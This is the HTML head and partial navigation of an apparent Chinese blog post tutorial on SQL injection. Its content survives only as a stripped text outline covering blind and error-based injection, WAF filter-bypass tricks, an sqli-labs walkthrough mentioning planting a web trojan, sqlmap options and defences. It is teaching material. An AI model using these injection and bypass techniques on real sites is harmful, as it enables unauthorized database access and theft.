<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SQL注入 | Shalom`s Blog</title><meta name="keywords" content="网络安全,web安全,SQL注入"><meta name="author" content="Shalom"><meta name="copyright" content="Shalom"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SQL注入"><meta name="application-name" content="SQL注入"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SQL注入"><meta property="og:url" content="https://blog.shalom86012.eu.org/2024/11/07/SQL%E6%B3%A8%E5%85%A5/index.html"><meta property="og:site_name" content="Shalom`s Blog"><meta property="og:description" content="1 数据库基础知识1.1 MySQL1.1.1 简介MySQL 是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。  关系型数据库：指多张相互连接的二维表组成的数据库，所谓二维表指的就是由行和列组成的 表。例如：Oracle、DB2、SQLServer。"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://img.shalom86012.eu.org/imgs/wallhaven-9mdjx1.jpg"><meta property="article:author" content="Shalom"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://img.shalom86012.eu.org/imgs/wallhaven-9mdjx1.jpg"><meta name="description" content="1 数据库基础知识1.1 MySQL1.1.1 简介MySQL 是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。  关系型数据库：指多张相互连接的二维表组成的数据库，所谓二维表指的就是由行和列组成的 表。例如：Oracle、DB2、SQLServer。"><link rel="shortcut icon" href="https://img.shalom86012.eu.org/imgs/Shalom.webp"><link rel="canonical" href="https://blog.shalom86012.eu.org/2024/11/07/SQL%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-TECSCZ4DMP"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-TECSCZ4DMP');
</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;49e17b2f76e54defab58d9e307081e71&quot;}"></script><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: 'https://twikoo-vercel.shalom86014.eu.org/',
  commentBarrageConfig:undefined,
  music_page_default: "nav_music",
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助"]},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Shalom","link":"链接: ","source":"来源: Shalom`s Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'Shalom`s Blog',
  title: 'SQL注入',
  postAI: '',
  pageFillDescription: '1 数据库基础知识, 1.1 MySQL, 1.1.1 简介, 1.1.2 常见命令, 1) 注释, 2) 查询所有数据库, 3) 查看一个数据库里所有的表, 4) 查询库中（所有的）字段x2F列, 5) 查询表中的数据：, 6) 查看当前选择的是哪个库, 7) 查看版本：, 8) 查看当前登录数据库的用户：, 9) 查看数据存储路径：, 10) 查看MySQL安装路径：, 11) 查看MySQL安装的系统：, 12) 查看主机名称：, 13) 查看时间, 14) 创建库：, 15) 创建表：, 16) 删除表：, 17) 修改表：, 18) 查看表结构：, 19) 插入数据到表中：, 1.2 MSSQL, 1.2.1 简介, 1.2.2 库结构, 1.3 Oracle, 1.3.1 简介, 2 web十大漏洞, 3 SQL注入, 3.1 SQL注入原理, 3.2 查找注入点位置, 3.3 SQL注入分类, 3.3.1 数据类型分类, 1) 数字型, 2) 字符型, 3) 搜索型, 4) xx型, 5) Json类型（额外加的）, 3.3.2 提交方式分类, 3.3.3 请求数据位置分类, 3.3.4 报错注入, 3.3.5 布尔型盲注, 1) 判断闭合符类型, 2) 爆数据库长度, 3) 查询库名, 3.1) 手动注入, 3.2) burpsuite爆破, 4) 爆破表名, 5) 爆破列名, 6) 爆破具体值, 3.3.6 时间盲注, 3.4 绕过方式, 3.4.1 注释符号绕过, 3.4.2 大小写绕过, 3.4.3 内联注释绕过, 3.4.4 双写绕过, 3.4.5 编码绕过, 1) URL编码, 1.1) 简介, 1.2) 编码规则, 1.2.1) 对保留字符的百分号编码, 1.2.2) 对百分号字符的百分号编码, 1.2.3) 对非ASCII字符的百分号编码, 2) ASCII编码, 4) 16进制绕过, 5) Unicode编码, 3.4.6 大于小于号绕过, 3.4.7 空格绕过, 3.4.8 or and xor not 绕过, 3.4.9 等号绕过, 不加通配符的like, regexp, 使用大小于号来绕过, 使用ltgt绕过, 3.4.10 单引号绕过, 十六进制, 宽字节, 3.4.11 逗号绕过, from pos for len, join关键字绕过, like关键字, offset关键字, 3.4.12 过滤函数绕过, 3.4.13 堆叠注入时利用 MySql 预处理, 3.4.14 ‘.md5($passtrue).‘ 登录绕过, 附录 PHP中一些常见的过滤方法及绕过方式, , 注入防护, sqli-labs, Less - 1~20, Less - 21~37, Less - 38~53, Less - 54~75, 4 sqlmap, 4.1 Github README, 4.1.1 演示截图, 4.1.2 安装方法, 4.1.3 使用方法, 4.1.4 链接, 4.2 参数用法, 4.2.1 常规步骤, 4.2.2 常用参数, -u 指定URL, -m 指定文件, -r POST请求, -p, –batch, –flush-session, –dbms, –level, –risk, –method, –random-agent, –user-agent, –proxy, –tamper, –technique, 其它数据库基础知识简介是一个关系型数据库管理系统由瑞典公司开发目前属于公司关系型数据库指多张相互连接的二维表组成的数据库所谓二维表指的就是由行和列组成的表例如非关系型数据库不使用固定的表结构存储数据而是使用键值对文档列族或图结构例如常见命令注释第一种后面必须加空格第二种查询所有数据库相当于表存储了所有的库信息结果拼接成一行查看一个数据库里所有的表查询没有结果可以把库名换成进制不带引号格式为开头后跟完整进制库名查询库中所有的字段列库名表名查询表中的数据表名库名表名字段字段库名表名库名表名字段字段库名表名字段库名表名当字段数量与后面数字个数相等时不报错用于确定字段数量查看当前选择的是哪个库数据库和部分语法相同查看版本查看当前登录数据库的用户查看数据存储路径查看安装路径查看安装的系统查看主机名称例如查看时间创建库库名创建表库名表名删除表表名修改表表名字段添加字段查看表结构表名插入数据到表中表名张王简介是公司推出的关系型数据库管理系统默认监听的端口为库结构服务由一个实例和多个数据库组成实例包含了后台线程和占用的内存默认的系统数据库包括以及系统数据库说明数据库记录实例的所有系统级信息数据库用于代理计划警报和作业数据库用作实例上创建的所有数据库的模板对数据库进行的修改如数据库大小排序规则恢复模式和其他数据库选项将应用于以后创建的所有数据库数据库一个只读数据库包含包括的系统对象系统对象在物理上保留在数据库中但在逻辑上显示在每个数据库的架构中数据库一个工作空间用于保存临时对象或中间结果集简介又名简称数据库系统是美国公司甲骨文提供的以分布式数据库为核心的一组软件产品是最流行的客户服务器或体系结构的数据库之一比如就是基于数据库的一种中间件十大漏洞访问控制失效加密失败注入不安全设计安全配置错误脆弱过时组件识别与认证失败软件和数据完整性故障安全日志与检测失败服务器端请求伪造注入注入原理注入即是指应用程序对用户输入数据的合法性没有判断或过滤不严攻击者可以在应用程序中事先定义好的查询语句的结尾上添加额外的语句在管理员不知情的情况下实现非法操作以此来实现欺骗数据库服务器执行非授权的任意查询从而进一步得到相应的数据信息查找注入点位置前端页面上所有提交数据的地方不管是登录注册留言板评论区分页等只要是提交数据给后台后台拿着数据和数据库交互了那么这个地方就可能存在注入点注入分类数据类型分类数字型加单引号对应的这时语句出错程序无法正常从数据库中查询出数据就会抛出异常加对应的语句执行正常与原始页面没有差异加对应的语句可以正常执行但是无法查询出结果所以返回数据与原始网页存在差异字符型加单引号由于加单引号后变成三个单引号则无法执行程序会报错加此时语句为无法进行注入还需要通过注释符号将其绕过因此构造语句为可成功执行返回结果正确加此时语句为则会报错如果满足以上三点可以判断该为字符型注入判断列数报错没有报错说明存在列爆数据库爆表名数据库名第个限制数量为爆字段爆数据值是的编码搜索型型类型额外加的正常恶意提交方式分类请求数据位置分类请求行请求头请求体报错注入页面的报错信息中返回了数据库的相关信息例如返回了数据库用户信息对文档数据进行查询和修改的函数针对数据的内容替换函数拼接前后两个参数要么直接写数字要么必须用单引号扩着有些数据库名称不一定是可能是自定义的截取数据库名查询指定数据库的表并截取查询指定数据库指定表的所有字段查询指定表的数据对文档数据进行查询的函数中用来取整的函数布尔型盲注当我们改变前端页面传输给后台参数时页面没有显示相应内容也没有显示报错信息时页面呈现出两种状态正常或者不正常根据这两种状态可以判断我们输入的语句是否查询成功不能使用联合查询注入和报错注入这时我们可以考虑是否为布尔盲注以关为例判断闭合符类型当输入页面显示没有结果但当加入之后页面又显示正常这说明闭合符就是爆数据库长度函数返回字符串的长度这里采用二分法直到找到一个分界点即为数据库长度查询库名手动注入返回码值要截取的字符串开始位截取的长度截取字符串构造显示正常显示异常说明数据库名的第一个字符的码值为查询码表即可得知对应的字符为查询第二个字符需要将开始位改为再一个一个查询即已知库名长度为八我们可以尝试手动注入八次爆破方法一用码值转化爆破的第一个表示从第一位开始第二个一表示每次爆破一位于是我们的爆破点就有两个抓包放到模块中选中和添加爆破标记一号爆破点选择因为之前我们已经得知数据库名字长度为位了所以只需选择一到八二号爆破点选择的是字母的码值可以从本地导入最后开始攻击在结果页面根据长度大小排序来区分成功和失败有些网站的成功失败页面大小一样无法区分只能选取其它方法了查询码表即可得知库名方法二方法直接爆破字母参数参数意为将参数从左开始取参数个示例返回值为将其与字符串进行比较例如返回结果为因为返回结果为因为是要大于根据返回的结果的真假与前面的语句用相连接构造逻辑关系构造用抓包后选择字符为爆破点爆破内容选择个字母这种方法的限制是一次只能爆破一个字母如果要接着爆破下一个字母需要在爆破点前加上爆破出来的字母并将函数里面的数字修改如爆破第二个字母需要将改为并在爆破点前加上刚刚爆破出来的这种方法的缺点是过于复杂需要逐次爆破通常不使用这种方法方法三方法爆破注入最简单如果则返回否则返回构造从库名选择第一个字母判断其是否等于如果是则返回页面正常显示如果不是则返回页面显示异常将第一个数字和字母添加为爆破点第一个爆破点的数据为是库名长度第二个爆破点数据为字母加上等字符爆破表名表示从第一条开始取出一条数据需要注意的是默认下标从开始第一个参数是下标查数据的话是从第一条查第二个参数限定了几条数据选择爆破点为中的第一个与字母选择集束炸弹模式让两个爆破点爆破的数据随机组合爆破列名将中的第一个与字母添加为爆破点爆破具体值首先爆破的值构造接下来爆破的值构造时间盲注时间盲注又称延迟注入适用于页面不会返回错误信息只会回显一种界面与布尔盲注类似其主要特征是利用函数或者函数让执行时间变长制造时间延迟由回显时间来判断是否报错函数延迟秒后回显上面语句意思是如果数据库长度大于等于我们就延时秒后进行回显与布尔盲注类似判断库名得到库名为后接着判断表名判断列名绕过方式参考链接注释符号绕过注释内容注释内容注释内容大小写绕过可以利用的原因有两个语句对大小写不敏感开发人员做的黑名单过滤过于简单内联注释绕过内联注释就是把一些特有的仅在上的语句放在中这样这些语句如果在其它数据库中是不会被执行但在中会执行双写绕过在某一些简单的中将关键字等只使用函数置换为空这时候可以双写关键字绕过进行一次这样的过滤就双写两次就三写以此类推编码绕过编码编码对关键字进行两次全编码参考链接简介百分号编码英语又称编码是特定上下文的统一资源定位符的编码机制实际上也适用于统一资源标志符的编码所允许的字符分作保留与未保留保留字符年月未保留字符年月中的其它字符必须用百分号编码编码规则对保留字符的百分号编码如果一个保留字符在特定上下文中具有特殊含义称作且中必须使用该字符用于其它目的那么该字符必须百分号编码首先需要把该字符的的值表示为两个进制的数字然后在其前面放置转义字符置入中的相应位置例如编码后是保留字符的百分号编码对百分号字符的百分号编码编码后是对非字符的百分号编码需要转换为一种针对的可变长度字符编码字节序然后每个字节按照百分号加码的形式表示例如百分号编码编码后是编码在线工具编码进制绕过编码以下示例来自网络未验证正确性单引号空格左括号右括号大于小于号绕过大于号小于号原句绕过返回中的最大值或返回中的最小值若则返回零若则返回负数若则返回正数空格绕过正常括号绕过来源网络未验证等号绕过不加通配符的正常加上通配符的不加上通配符的可以用来取代中使用操作符来进行正则表达式匹配使用大小于号来绕过使用绕过等价于所以在前面再加一个结果就是等号了单引号绕过十六进制的十六进制的字符串是原句绕过宽字节编码会认为两个字符为一个汉字例如就是一个汉字運编码在线查询運编码单引号空格号反斜杠逗号绕过盲注时常用到以下的函数从第个字符开始取长度为的子串从开始取到的最后用法和一样用法和一样但是是为了向下兼容已经过时以上的几个函数的都是从开始的和和分别是从左或从右取中长度为的子串在返回项中从开始取个返回值从开始和把字符转为码和的作用相反将码转字符关键字绕过原句绕过括号后面的是随意命名的是省略了的写法关键字适用于等提取子串的函数中的逗号原句绕过查询是否以开头关键字原句从第个开始取个结果返回绕过跳过前条记录返回接下来的条记录过滤函数绕过第一个参数是执行次数第二个是执行的表达式将字符转成十六进制将十进制值转换为二进制字符串示例来自未验证用于分隔各个字符串的分隔符需要连接的一个或多个字符串此查询将返回每个用户的全名分隔符是空格例如可以相互取代取子串的函数还有返回字符串第一个字符的值如果不为则函数返回否则返回堆叠注入时利用预处理堆叠注入一次性注入并执行多条语句在遇到堆叠注入时如果和等语句都被过滤的话我们可以用预处理语句配合拼接来执行语句准备一条语句并分配给这条语句一个名字供之后调用执行命令释放命令用于设置变量借助函数将码转化为字符然后再使用函数将字符连接起来也可以不用函数直接用函数登录绕过很多站点为了安全都会利用这样的语句加密后为进制解码为字符串后是格式为语句变为相当于万能密码必需要计算的字符串可选规定十六进制或二进制输出格式原始字符二进制格式默认字符十六进制数附录中一些常见的过滤方法及绕过方式过滤关键字代码会过滤的攻击代码绕过方式过滤关键字代码会过滤的攻击代码绕过方式过滤关键字代码会过滤的攻击代码绕过方式过滤关键字代码会过滤的攻击代码绕过方式聚合中为的为过滤关键字代码会过滤的攻击代码绕过方式过滤关键字代码会过滤的攻击代码绕过方式过滤关键字代码会过滤的攻击代码绕过方式过滤关键字代码会过滤的攻击代码绕过方式十进制的转化为十六进制并小写过滤关键字代码会过滤的攻击代码绕过方式过滤关键字空格代码会过滤的攻击代码绕过方式过滤关键字代码会过滤的攻击代码绕过方式注入防护对提交的数据进行数据类型判断比如值必须是数字对提交的数据进行正则匹配禁止出现注入语句比如等对提交的数据进行特殊符号转义比如单引号双引号等用等函数加工一下参数化查询也叫做参数绑定的方式对提交的参数进行预编译然后进行参数绑定这样会将用户提交的注入语句作为参数值处理而不是当作语句执行这样可以有效防范注入但预编译不能完全解决注入问题比如查询语句中表名是动态的也就是说表名可以是用户提交过来的数据根据用户提交的表名来进行不同的查询那么也会出现注入漏洞因为表名不能进行预编译及参数绑定这就需要配合白名单进行过滤分级管理用户的权限要进行严格控制和划分服务端代码连接数据库使用的用户禁止使用等高权限用户比如对于普通用户禁止给予数据库建立删除修改等相关权限只有系统管理员才有增删改查的权限等等数据库中敏感的数据比如用户密码加密存储对于语言编写的网站大都是和数据库结合的可通过如下几种方法结合起来防范注入的漏洞修改中默认配置文件中的配置来降低注入的风险参考路径不同中间件可能位置不一样修改如下几项开启安全模式开启过滤函数禁止错误信息提示注把选项打开在这种情况下所有的客户端和的数据都会自动进行处理所以此时对字符串值的注入是不可行的但要防止对数字值的注入如用等函数进行处理但如果你编写的是通用软件则需要读取服务器的后进行相应处理训练平台靶场详解正常报错说明有列回显回显数据库名用户名查询所有数据库查询指定库中的表查询表中所有字段查询表中数据回显参考由报错判断闭合为回显参考回显参考获取数据库截取数据库名查询指定数据库的表并截取查询指定数据库指定表的所有字段查询指定表的数据获取数据库参考写入木马蚁剑连接正常不显示爆数据库长度爆数据库名爆库名爆库名判断列为回显获取数据库名和用户名获取数据库名官网下载地址是一款开源的渗透测试工具可以自动化进行注入的检测利用并能接管数据库服务器它具有功能强大的检测引擎为渗透测试人员提供了许多专业的功能并且可以进行组合其中包括数据库指纹识别数据读取和访问底层文件系统甚至可以通过带外数据连接的方式执行系统命令使用方法参数可以运行在和的任何平台上官方使用指南官网中文演示截图你可以查看上的截图了解各种用法的示例安装方法你可以点击这里下载最新的打包好的源代码或者点击这里下载最新的打包好的源代码推荐直接从仓库获取最新的源代码可以运行在和版本的任何平台上使用方法通过如下命令可以查看基本的用法及命令行参数通过如下的命令可以查看所有的用法及命令行参数你可以从这里看到一个的使用样例除此以外你还可以查看使用手册获取所有支持的特性参数命令行选项开关及详细的使用帮助链接项目主页源代码下载的订阅问题跟踪器使用手册常见问题教程截图参数用法参考链接常规步骤判断是否有注入查看所有数据库查看当前使用的数据库查看指定数据库的表查看指定库和表的列名查看数据值常用参数指定不能直接扫描网站漏洞先用其他扫描工具扫出注入点再用验证并利用注入点指定文件准备一个文件写上需要检测的多个一行一个请求可以将一个请求方式的数据包抓包保存在一个中会通过方式检测目标指定测试的注入点在所有需要用户输入的部分通常是询问执行还是执行默认操作不需要用户再输入使用该参数表示清除当前目标的会话文件在测试某一目标后会生成文件该文件保存了测试的结果信息当我们再次测试该目标时会自动加载上一次的结果当我们想重新测试该目标时可以使用该参数清除当前目标的会话文件指定数据库类型指定测试复杂等级共有五个级别从默认值为等级越高测试的越复杂当使用默认等级注入不出来时可以尝试使用来提高测试等级指定测试风险风险级别默认常用级别提高会增加数据被篡改的风险指定是方法还是方法随机选择请求头中的自定义自定义指定一个代理指定使用某些绕过脚本使用方法脚本路径脚本路径使用参数可以在一定程度上避开应用程序的敏感字符过滤绕过规则的阻挡继而进行渗透攻击提供了部分篡改脚本存放在项目路径文件夹中也可以自己编写篡改脚本实现自定义的绕过默认情况下会测试所有的注入类型基于布尔的盲注基于错误基于联合查询堆叠查询基于时间的盲注内联查询其它这些选项可以用来列举后端数据库管理系统的信息表中的结构和数据脱库时使用获取数据库管理系统的标识获取数据库管理系统当前用户获取数据库管理系统当前数据库获取数据库服务器的主机名称检测当前用户是否枚举数据库管理系统用户枚举数据库管理系统用户密码哈希枚举数据库管理系统用户的权限枚举数据库管理系统数据库枚举数据库中的表枚举数据库表列要进行枚举的指定数据库名要进行枚举的指定表名要进行枚举的指定列名获取值也就是表中数据获取字段类型搜索列表和或数据库名称要执行的语句提示交互式的',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-11-07 22:18:26',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://img.shalom86012.eu.org/imgs/Shalom.webp"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Shalom`s Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/IDM/" style="font-size: 1.05rem;">IDM<sup>1</sup></a><a href="/tags/Log4j2/" style="font-size: 1.05rem;">Log4j2<sup>1</sup></a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">SQL注入<sup>1</sup></a><a href="/tags/Vulhub/" style="font-size: 1.05rem;">Vulhub<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 1.05rem;">XSS<sup>1</sup></a><a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">web安全<sup>4</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/" style="font-size: 1.05rem;">博客教程<sup>1</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 1.05rem;">文件上传<sup>1</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A/" style="font-size: 1.05rem;">漏洞报告<sup>1</sup></a><a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size: 1.05rem;">破解<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">网络安全<sup>5</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/01/"><span class="card-archive-list-date">一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a 